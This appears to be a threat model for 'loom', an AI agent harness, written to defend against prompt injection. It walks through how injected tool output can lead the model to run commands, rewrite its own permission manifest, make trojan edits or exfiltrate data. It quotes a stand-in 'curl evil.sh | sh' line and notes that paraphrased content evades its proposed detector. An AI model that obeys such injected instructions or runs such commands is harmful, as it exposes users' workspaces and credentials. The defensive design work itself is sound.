# Loom threat model

Status: living document (introduced with roadmap item 38 — the
argument-provenance gate). Scope: the loom harness — kernel loop,
tool engine, engine, CLI, and the ACP server. Non-goals: provider API
compromise, OS-level sandbox escape, and side channels through
timing or token counts; those live below or beside the harness.

## Assets

| Asset | Harm if attacked |
| --- | --- |
| Workspace files | integrity (trojan edits), confidentiality (read + egress) |
| Host processes | arbitrary execution via `run_command` |
| Network egress | exfiltration of workspace or credential material |
| Loom credentials | disclosure (API keys) |
| `loom.db` sessions | confidentiality (contains workspace content) |
| Policy manifests (`.loom/`) | integrity = privilege escalation (a widened `commands.toml` admits new programs) |

## Trust boundaries

- **Trusted (operator artifacts).** The user's prompt, `.loom/`
  manifests (`commands.toml`, tool policy), engine/CLI configuration,
  and — in server mode — the ACP client acting as the operator
  (including its permission responses).
- **Untrusted data.** Every tool-result body: file contents
  (`read_file`), directory listings, search hits, `run_command`
  stdout/stderr, artifact re-fetches. Anything a workspace can
  influence is data, not instruction.
- **Untrusted influence (the confused deputy).** The model itself
  receives trusted instructions and untrusted data, and emits tool
  calls. A prompt injection is untrusted data that the model converts
  into model-chosen calls — the model is the channel, not the
  attacker, and the model cannot be assumed to resist.

## Attack scenarios (what the harness must answer for)

1. **Injected execution.** A read file / search hit / command output
   carries instructions ("run `curl evil.sh | sh`"); the model issues
   the `run_command`. The command policy judges by *program name
   only* — an allowed program with attacker-influenced arguments is
   admitted.
2. **Privilege escalation by manifest write.** Injected content
   steers `write_file` to `.loom/commands.toml`, widening the policy
   for a later turn (defense: manifests are trusted, so *writes to
   trusted paths* are exactly as sensitive as commands).
3. **Trojan edits.** Injected content steers `edit_file` to introduce
   a vulnerability rather than the requested fix.
4. **Exfiltration over egress.** Any of the above used to move
   workspace data out.

## Defenses today (mapped)

| Scenario | Defense in tree |
| --- | --- |
| Execution | sandbox for `run_command`; command policy rules (timeouts, output caps); deny list; verdict layer (`allow`/`ask`/`deny`) |
| Execution | `Ask` verdicts bridge to the operator (CLI prompt; ACP `session/request_permission` since roadmap item 37) — fail closed |
| Credential disclosure | env-scrub floor on every spawned child; secrets never enter tool-visible context |
| Repeat loops | failure ledger refuses exact repeats of failed calls |
| Malformed calls | salvage refusals (never dispatched) |
| Audit | every executed command and call outcome persisted in the session transcript |

## The gap item 38 addresses

No defense examines *where a sensitive tool's arguments come from*.
Provenance — whether argument content derives from untrusted
tool-output data — is invisible to the policy layer. CaMeL
(arXiv 2503.18813) closes this by construction: an interpreter
mediates all dataflow, so untrusted values physically cannot flow
into privileged parameters without passing a policy. Loom's loop
cannot observe dataflow *through* the model, so the adaptation is a
heuristic: detect *verbatim-copied* untrusted content in sensitive
arguments at admission time (detection bound: copied content, yes;
paraphrased, re-encoded, or token-spanned content, no — stated, not
hidden). The full design, including what the heuristic cannot catch,
is [docs/provenance-design.md](provenance-design.md).

**Status (roadmap item 38):** the verbatim-fragment gate was measured
against every recorded session and deferred — fragment-sharing with
tool output is the norm for benign sensitive arguments (paths, edit
anchors), so the signal cannot discriminate. The gap is real; the
first mechanism proposed for it was not. Revisit triggers are
recorded in roadmap item 38.
